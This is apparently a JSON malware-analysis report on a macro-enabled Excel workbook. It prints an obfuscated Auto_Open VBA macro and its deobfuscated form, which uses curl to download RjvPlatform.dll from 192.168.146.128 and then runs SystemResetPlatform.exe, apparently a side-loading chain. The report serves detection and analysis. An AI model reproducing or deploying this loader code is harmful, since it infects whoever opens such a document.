{
    "threat_score": 570,
    "has_macros": true,
    "ioc": true,
    "vba_obfuscated": false,
    "autoexec": true,
    "macros": [
        {
            "filename": "xl/vbaProject.bin",
            "stream_path": "VBA/Module1",
            "vba_filename": "Module1.bas",
            "macros": "Attribute VB_Name = \"Module1\"\r\nPrivate Function eXKjTSvttweDPmk(HQqTRYjYchrQ As Variant, ImzlDuuhigXwzD As Variant)\r\nDim flSUqDhCaPmR As String\r\nflSUqDhCaPmR = \"\"\r\nFor i = LBound(HQqTRYjYchrQ) To UBound(HQqTRYjYchrQ)\r\nflSUqDhCaPmR = flSUqDhCaPmR & Chr(ImzlDuuhigXwzD(i) Xor HQqTRYjYchrQ(i))\r\nNext\r\neXKjTSvttweDPmk = flSUqDhCaPmR\r\nEnd Function\r\nSub Auto_Open()\r\nCall oqWlxdQqUhHJj(eXKjTSvttweDPmk(Array((32 + 72), 206, 247, 86, ((207 - 48) + (90 - 6)), (239 - 33), 197, 16, (58 Xor (39 + (67 - 28))), ((14 - 7) Xor 11), 95, (80 + (39 - 1)), 208, 162, 144), Array((43 - 0), (98 + 146), ((98 - 26) Xor 227), (((115 - 37) + 14) Xor 46), 160, ((215 - 68) + (39 - 3)), ((134 - 60) Xor 252), ((54 - 22) + 34), 17, ((44 + 4) Xor 79), ((83 - 38) Xor 23), 2, ((8 + 12) Xor (287 - 135)), 228, 226)) & _\r\neXKjTSvttweDPmk(Array(((22 - 9) + (3 - 0)), 176, (57 Xor ((46 - 19) + 100)), 86, 190, 63, (181 + 28), 58, ((67 - 6) + (27 - 0)), 127, (14 Xor 190), 163, 237), Array(((162 - 66) Xor (10 + (11 - 4))), (244 - 23), 35, ((4 - 2) Xor ((38 - 14) + (21 - 10))), (96 Xor 177), (80 - 3), (225 - 39), (21 + 81), ((4 + (3 - 0)) Xor 12), 11, ((188 - 33) Xor 74), (339 - 147), (30 Xor (108 + 44)))))\r\nSet XjcHGNRSbhHWtT = CreateObject(eXKjTSvttweDPmk(Array(143, (28 Xor 58), ((24 + (154 - 73)) Xor 155), 124, (444 - 208), (46 + 40), ((61 + (31 - 9)) Xor 245), ((50 - 4) + (151 - 38)), ((1 + 3) Xor 89), 188, (29 Xor 178), (171 Xor ((10 - 3) + 84)), 123), Array(216, ((56 + (24 - 5)) Xor 62), 145, 14, 133, (((2 - 0) + (4 - 1)) Xor (63 - 28)), 210, (195 - 18), 14, (388 - 176), 202, 156, 23)))\r\nIf Dir(eXKjTSvttweDPmk(Array((151 Xor 79), (241 Xor ((0 - 0) + 4)), (50 Xor (104 + 12)), 4, (426 - 186), 115, 242, ((61 - 12) + (229 - 60)), 154, (13 Xor (139 + 53)), 152, (112 + (110 - 26)), (104 - 25), (99 Xor 232), (356 - 163)), Array(155, (163 + (83 - 39)), (36 - 10), (10 + (25 - 3)), ((262 - 99) + 0), (13 - 3), 129, (119 Xor 255), (443 - 188), 190, 253, ((46 - 13) + 143), ((30 - 14) + (5 - 2)), (177 + 28), 179)) & _\r\neXKjTSvttweDPmk(Array(((14 - 6) + 8), (333 - 94), 157, (43 Xor 160), 99, ((80 - 28) Xor (10 + 96)), 0, 31, (298 - 148), 216, 31, (26 + 75), 6, (8 Xor 43), 113), Array((102 Xor 23), (213 - 83), (304 - 56), (21 + 231), (18 - 6), ((27 - 12) + 29), ((78 + (26 - 7)) Xor ((3 - 0) + 7)), 67, ((79 - 38) Xor (367 - 131)), 172, (85 + 41), 6, (68 Xor 41), (84 Xor (32 + 11)), 35)) & _\r\neXKjTSvttweDPmk(Array((50 Xor 83), ((1 + 0) Xor (0 + 9)), (21 Xor 57), 116, 150, 182, (123 + (110 - 55)), (242 - 59), 189, (174 Xor (36 + 29)), (101 Xor (259 - 15)), (107 Xor 151), (((23 - 0) + (45 - 15)) Xor 201), ((9 + 9) Xor 66)), Array(11, (248 - 122), 124, 24, (121 + (199 - 73)), 194, 212, (128 Xor 88), 207, ((66 - 28) Xor 164), 191, (156 - 4), (48 + 96), 60)), vbDirectory) = vbNullString Then\r\naaaa = eXKjTSvttweDPmk(Array((404 - 159), (303 - 123), (265 - 86), 36, ((98 - 29) Xor (15 + 25)), (77 Xor 36), (10 + 7), ((279 - 126) Xor 79), 11, (72 Xor (54 + 141)), ((259 - 120) Xor 54), (177 Xor 12), (((136 - 56) + 34) Xor (177 + (32 - 10))), ((155 + 49) Xor (87 - 34)), ((167 - 11) Xor 48)), Array((((0 - 0) + (0 - 0)) Xor 150), 193, ((8 + 3) Xor (362 - 160)), (2 Xor 74), (39 + 38), 1, (12 Xor 105), (15 Xor 173), (((14 - 5) + 24) Xor (37 + 53)), (138 Xor 59), ((152 - 42) + 36), (67 Xor 209), (56 Xor (73 + 115)), (283 - 91), 158)) & _\r\neXKjTSvttweDPmk(Array((117 Xor (85 + 164)), (72 + 96), 33, 142, ((43 - 9) + 175), 70, 184, ((27 + (142 - 57)) Xor (150 + (49 - 22))), 230, (136 - 22), (163 - 4), 15, (((0 - 0) + 58) Xor 223), (151 + 15), 98), Array(((188 - 58) Xor 32), (40 Xor ((80 - 40) + (240 - 103))), (21 + (4 - 2)), (180 + 2), 255, 119, (131 + 9), 247, 200, (18 Xor (143 - 62)), ((222 - 62) + (15 - 2)), (47 Xor 24), (335 - 133), ((146 - 71) + 169), (13 - 5))) & _\r\neXKjTSvttweDPmk(Array(254, (64 Xor 232), (143 Xor 24), (206 Xor (16 + 27)), (1 Xor (0 + (4 - 2))), ((146 - 55) Xor (5 + (93 - 41))), ((89 - 21) Xor 56), (81 + 49), (50 Xor (14 + 166)), 91, 179, 105, 180, (164 - 28), (47 Xor 243)), Array(136, (85 + (200 - 37)), 251, 132, ((44 - 2) + 77), ((0 - 0) + (8 - 4)), ((13 - 2) + (15 - 7)), 240, ((8 + (12 - 1)) Xor ((300 - 80) + 28)), (83 + 34), (89 + (203 - 77)), 5, ((234 - 98) Xor ((71 - 22) + 31)), (174 - 6), ((147 + 65) Xor ((18 - 7) + 26)))) & _\r\neXKjTSvttweDPmk(Array(246, (457 - 224), 83, 231, ((5 - 2) + 22), ((56 + (26 - 13)) Xor 175), (0 Xor (4 - 2)), ((130 + 7) Xor (39 - 2)), (97 Xor 26), (378 - 169), 59, 81, 140, 186, (166 - 54)), Array(153, 201, 16, (27 Xor (228 - 30)), ((51 - 19) + 37), 206, (30 + 51), (133 + 80), 8, 131, (2 Xor 92), 34, (62 Xor 215), 206, (1 + 43))) & _\r\neXKjTSvttweDPmk(Array(232, (4 + (280 - 52)), 217, 254, (24 Xor (145 - 12)), (89 - 1), (402 - 165), ((41 - 20) + 0), 16, (0 + (380 - 133)), ((84 - 26) Xor 169), (21 Xor ((0 - 0) + 2)), (((20 - 9) + (6 - 2)) Xor 16), 31, 74), Array(174, ((37 - 6) Xor ((213 - 96) + 16)), (240 - 56), 147, 248, (19 Xor ((102 - 44) + 2)), (101 Xor ((95 - 14) + 150)), 103, (82 + 41), (72 + (189 - 90)), ((44 + 76) Xor 184), 99, (34 Xor (121 - 29)), 124, 33)) & _\r\neXKjTSvttweDPmk(Array((170 Xor 112), 2, 11, 94, 234, (11 Xor 17), 51, 120, 18, ((44 + (90 - 28)) Xor (31 + 129)), ((258 - 113) Xor ((50 - 17) + 41)), (212 + (2 - 0)), (101 + 63), 115, ((7 + 16) Xor (145 - 52))), Array((((3 - 0) + 76) Xor 201), (40 Xor 120), (21 Xor 116), 40, (39 Xor (162 - 5)), ((3 + 84) Xor (24 + 9)), 82, 12, (192 - 76), 165, (199 - 30), (187 - 0), ((6 + (24 - 8)) Xor (211 - 55)), ((25 - 12) Xor (51 - 25)), ((51 - 19) + (6 - 0)))) & _\r\neXKjTSvttweDPmk(Array((113 Xor 180)), Array((83 Xor 250)))\r\nSet YCHojjpcsJKhWy = XjcHGNRSbhHWtT.Exec(aaaa)\r\nEnd If\r\nApplication.Wait (Now + TimeValue(eXKjTSvttweDPmk(Array((21 + 58), (42 + 191), 225, 75, ((7 - 2) + 10), (26 Xor (245 - 109)), 125), Array(127, ((24 + 0) Xor 203), (10 Xor 219), (11 + (118 - 6)), (53 Xor 0), (50 + 112), 78))))\r\nSet dMNDiRhQIZpAW = XjcHGNRSbhHWtT.Exec(eXKjTSvttweDPmk(Array(((42 - 0) + 111), (154 + 81), (41 Xor 4), 38, ((52 - 3) + 193), (267 - 57), (41 + 165), ((51 - 3) + 23), 242, 149, (39 + 26), 245, 213, (45 - 4), 133), Array(218, (43 + 166), (39 Xor (171 - 85)), 113, ((255 - 127) Xor ((11 - 3) + 19)), (221 - 33), (260 - 90), (63 - 23), 133, (179 + (100 - 49)), 29, 166, ((225 - 69) Xor 48), (92 - 2), (187 Xor ((129 - 58) + 3)))) & _\r\neXKjTSvttweDPmk(Array((164 Xor 3), 163, (102 + 122), (148 + 37), (131 + 24), 33, (193 - 21), (13 + 1), (277 - 136), (17 + (13 - 6)), (37 + 9), (95 - 21), (13 + 58), (249 - 98), (3 + 0)), Array((308 - 114), (161 Xor 111), ((112 + 41) Xor 74), (203 - 64), 199, 114, 213, (1 + 124), (194 Xor ((53 - 5) + 11)), 125, 67, (38 - 14), 34, (101 Xor 129), (183 - 81))) & _\r\neXKjTSvttweDPmk(Array((34 + 51), ((0 + (0 - 0)) Xor 39), 104, (18 + 11), ((337 - 149) + (2 - 1)), 237, ((74 + 55) Xor 7), (321 - 82), (((4 - 1) + (6 - 0)) Xor 154), 71, 83, (78 - 5), 117, ((210 - 76) + (92 - 25)), (12 + 158)), Array((66 - 33), ((38 + (8 - 1)) Xor (159 - 69)), (7 - 3), ((172 - 56) Xor 8), (205 - 4), ((24 + (38 - 8)) Xor 189), 233, 157, 254, 27, (0 - 0), (34 Xor ((11 - 5) + 12)), (7 - 1), 189, (145 Xor 94))) & _\r\neXKjTSvttweDPmk(Array((197 + 17), 156, 238, 125, 215, (24 + 111), ((133 - 61) + 0), (54 - 14), (((197 - 56) + (29 - 11)) Xor 88), (((112 - 22) + (44 - 20)) Xor 194), (94 + 94), (78 Xor ((23 - 8) + (15 - 2))), (135 - 29), 2, 137), Array(((26 - 4) + (197 - 32)), 206, (81 + 58), (9 + 5), 178, 243, 24, ((8 + 2) Xor (10 + (127 - 59))), (97 Xor (182 + 17)), (45 Xor ((39 - 8) + 202)), (308 - 90), (4 + 57), (7 + 17), (51 + 60), (288 - 121))) & _\r\neXKjTSvttweDPmk(Array((110 Xor 143), (233 - 56), (93 - 4)), Array(132, 201, 60)))\r\nApplication.Wait (Now + TimeValue(eXKjTSvttweDPmk(Array(205, (199 Xor (45 - 1)), 224, (290 - 140), (27 + 78), 3, ((24 - 1) + 8)), Array((357 - 104), 209, 208, 166, (162 - 79), ((41 - 12) + (29 - 7)), (31 Xor 53)))))\r\n\r\nEnd Sub\r\nFunction oqWlxdQqUhHJj(ZYTQZCTTBaEkED As String)\r\nDim evJKMFEwbAMKgYE As Variant\r\nDim rYVCmtSYBYZPx As String\r\nrYVCmtSYBYZPx = \"\"\r\nFor Each evJKMFEwbAMKgYE In Split(ZYTQZCTTBaEkED, eXKjTSvttweDPmk(Array(106), Array((39 + (26 - 11)))))\r\nrYVCmtSYBYZPx = rYVCmtSYBYZPx & evJKMFEwbAMKgYE & eXKjTSvttweDPmk(Array((101 - 16)), Array((9 Xor 0)))\r\nIf Len(Dir(rYVCmtSYBYZPx, vbDirectory)) = 0 Then MkDir rYVCmtSYBYZPx\r\nNext\r\nEnd Function\r\nFunction oMfgsdBRssppVPy()\r\nIf Dir(eXKjTSvttweDPmk(Array(((157 + 36) Xor 41), (62 Xor 161), ((374 - 187) Xor (69 + (86 - 33))), (3 + 225), (11 + (8 - 2)), 182, (72 + (14 - 1)), (74 - 27), 109, 27, 210, 40, (57 - 16), 95, 18), Array(((7 - 2) Xor 174), (84 Xor (9 + (327 - 95))), (46 + 111), ((58 - 4) + 138), 66, (103 Xor 168), 38, 125, 8, (68 + 36), (309 - 126), ((21 + 2) Xor ((79 - 36) + 32)), (149 - 32), (7 Xor 30), (36 + 60))) & _\r\neXKjTSvttweDPmk(Array((11 + (19 - 9)), 24, 97, 229, 120, (142 + (54 - 20)), ((23 + 95) Xor (12 - 0)), ((9 + 11) Xor 60), 78, (236 + 12), (132 + 16), ((47 - 15) Xor 17), 136), Array(((43 + 6) Xor (123 - 54)), (16 + (193 - 92)), 4, 146, (3 Xor 20), (119 Xor ((81 - 20) + (164 - 44))), 17, 116, ((12 - 6) Xor 27), (42 Xor (30 + (167 - 31))), (462 - 217), ((5 + (0 - 0)) Xor 87), (120 Xor (96 + (97 - 38))))), vbDirectory) <> vbNullString Then\r\nCreateObject(eXKjTSvttweDPmk(Array((79 - 2), (((0 - 0) + (120 - 39)) Xor ((273 - 121) + (86 - 20))), 141, ((152 - 63) + 109), 73, (184 - 13), 244, (134 Xor (2 - 1)), ((41 + 56) Xor 251), ((496 - 247) + 2), 163, 167, ((25 - 4) Xor (47 - 6)), 199, 120), Array(30, (89 Xor 177), 255, 175, ((40 - 5) Xor ((23 - 8) + 11)), 223, (2 Xor (239 - 80)), (100 + 133), 253, 213, (430 - 201), 206, 80, 162, 43)) & _\r\neXKjTSvttweDPmk(Array((50 Xor (201 + (72 - 26))), ((64 + (64 - 19)) Xor (183 - 48)), (((0 - 0) + 3) Xor (196 - 98)), 188, (200 - 89), ((273 - 79) Xor 12), 243, 142, (87 - 25), 74, (43 + (217 - 104))), Array(188, 153, ((16 - 3) Xor (22 + 2)), 217, ((2 - 1) Xor (2 + (1 - 0))), (37 + 92), ((102 - 39) + (99 - 17)), 228, 91, (12 Xor 37), (227 + 5)))).DeleteFolder eXKjTSvttweDPmk(Array(200, (135 Xor (107 - 40)), 4, (((157 - 73) + 29) Xor 198), (257 - 75), (203 - 92), ((23 + 1) Xor 111), ((9 + 20) Xor 218), (((0 - 0) + 1) Xor 51), (18 - 0), 246, ((116 - 18) Xor 221)), Array(139, 254, ((79 - 11) + 20), (238 - 91), (93 Xor 184), (5 + 17), 4, 149, 87, (40 + 57), 147, (155 + (77 - 29))))\r\nEnd If\r\nEnd Function\r\n\r\n\r\n"
        },
        {
            "filename": "xl/vbaProject.bin",
            "stream_path": "VBA/ThisWorkbook",
            "vba_filename": "ThisWorkbook.cls",
            "macros": "Attribute VB_Name = \"ThisWorkbook\"\r\nAttribute VB_Base = \"0{00020819-0000-0000-C000-000000000046}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = False\r\nAttribute VB_Customizable = True\r\n"
        },
        {
            "filename": "xl/vbaProject.bin",
            "stream_path": "VBA/Sheet1",
            "vba_filename": "Sheet1.cls",
            "macros": "Attribute VB_Name = \"Sheet1\"\r\nAttribute VB_Base = \"0{00020820-0000-0000-C000-000000000046}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = False\r\nAttribute VB_Customizable = True\r\n"
        }
    ],
    "dde": [],
    "keywords": [
        "Exec: command@May run an executable file or a system command using Excel 4 Macros (XLM/XLF)",
        "SystemResetPlatform.exe: executable@Executable file name",
        "RjvPlatform.dll: executable@Executable file name",
        "Hex Strings: vba_obfuscated@Hex-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)",
        "Chr: vba_obfuscated@May attempt to obfuscate specific strings (use option --deobf to deobfuscate)",
        "Auto_Open: autoexec@Runs when the Excel Workbook is opened",
        "Xor: vba_obfuscated@May attempt to obfuscate specific strings (use option --deobf to deobfuscate)",
        "Shell: command@May run an executable file or a system command",
        "WScript.Shell: command@May run an executable file or a system command",
        "http://192.168.146.128/RjvPlatform.dll: url@URL",
        "192.168.146.128: ip@IPv4 address",
        "MkDir: suspicious@May create a directory",
        "CreateObject: suspicious@May create an OLE object",
        "Call: suspicious@May call a DLL using Excel 4 Macros (XLM/XLF)",
        "Windows: suspicious@May enumerate application windows (if combined with Shell.Application object)"
    ],
    "deobfuscated_macro": "\nSub Auto_Open()\nCall oqWlxdQqUhHJj(C:\\$SysReset\\Framework\\Stack)\nSet XjcHGNRSbhHWtT = CreateObject(WScript.Shell)\nIf Dir(C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll, vbDirectory) = vbNullString Then\naaaa = curl http://192.168.146.128/RjvPlatform.dll -o C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll\nSet YCHojjpcsJKhWy = XjcHGNRSbhHWtT.Exec(aaaa)\nEnd If\nApplication.Wait (Now + TimeValue(0:00:03))\nSet dMNDiRhQIZpAW = XjcHGNRSbhHWtT.Exec(C:\\Windows\\System32\\SystemResetPlatform\\SystemResetPlatform.exe)\nApplication.Wait (Now + TimeValue(0:00:05))\n\nEnd Sub\n\nFunction oqWlxdQqUhHJj(ZYTQZCTTBaEkED As String)\nDim evJKMFEwbAMKgYE As Variant\nDim rYVCmtSYBYZPx As String\nrYVCmtSYBYZPx = \"\"\nFor Each evJKMFEwbAMKgYE In Split(ZYTQZCTTBaEkED, \\)\nrYVCmtSYBYZPx = rYVCmtSYBYZPx & evJKMFEwbAMKgYE & \\\nIf Len(Dir(rYVCmtSYBYZPx, vbDirectory)) = 0 Then MkDir rYVCmtSYBYZPx\nNext\nEnd Function\n\nFunction oMfgsdBRssppVPy()\nIf Dir(C:\\$SysReset\\Framework\\Stack, vbDirectory) <> vbNullString Then\nCreateObject(Scripting.FileSystemObject).DeleteFolder C:\\$SysReset\nEnd If\nEnd Function",
    "handle_output": [],
    "handle_suspicious_process": []
}